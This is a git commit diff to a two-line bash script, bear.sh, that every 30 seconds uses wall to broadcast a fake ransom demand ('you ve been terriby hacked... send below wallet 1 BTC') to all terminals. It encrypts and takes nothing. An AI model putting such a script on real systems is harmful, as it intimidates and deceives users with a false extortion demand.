1fbe7c7f6de51f0e08ec295b5e5e19fb603b0e60
PureDevOps <40662677+xeroxpro@users.noreply.github.com>
2023-06-17 01:41:54 +0300

    Update bear.sh

--- bear.sh
+++ bear.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-while sleep 30; do echo 'So Sorry but you ve been terriby hacked.....In order to have your files,please send below wallet 1 BTC' > /dev/pts/* | boxes -d bear; done 
+while sleep 30; do wall 'So Sorry but you ve been terriby hacked.....In order to have your files,please send below wallet 1 BTC' ; done 
